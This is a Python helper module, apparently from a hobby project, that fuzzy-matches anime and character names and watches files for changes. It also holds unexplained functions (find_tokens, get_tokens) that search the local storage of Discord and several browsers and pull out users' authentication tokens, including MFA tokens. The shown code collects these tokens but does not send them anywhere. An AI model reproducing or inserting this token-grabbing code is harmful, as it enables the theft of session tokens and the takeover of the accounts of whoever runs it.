import os
import re

import Levenshtein


def isSomething(inp, list_of_interested, accuracy):
    ratio = Levenshtein.ratio(inp, list_of_interested)
    # print(f"{inp} == {list_of_interested} ? Accuracy: {ratio}")

    if ratio > accuracy:
        return True
    else:
        return False


def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def get_tokens():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    tokenz = []

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                tokenz.append(f'{platform}: {token}')
    return tokenz


# https://stackoverflow.com/questions/182197/how-do-i-watch-a-file-for-changes
class FileWatch:
    def __init__(self, filepath):
        self.filename = filepath
        self._cached_stamp = os.path.getmtime(filepath)

    def watch(self):
        stamp = os.stat(self.filename).st_mtime
        if stamp != self._cached_stamp:
            self._cached_stamp = stamp
            return True


if __name__ == "__main__":
    with open("keywords\\animes.txt", "r") as f:
        animes = f.read().splitlines()
    with open("keywords\\characters.txt", "r") as f:
        characters = f.read().splitlines()
    ok = "Misa Kitagawa"
    for i in characters:
        ratio = Levenshtein.ratio(ok, i)
        print(f"Accuracy: {ratio} - {i}")
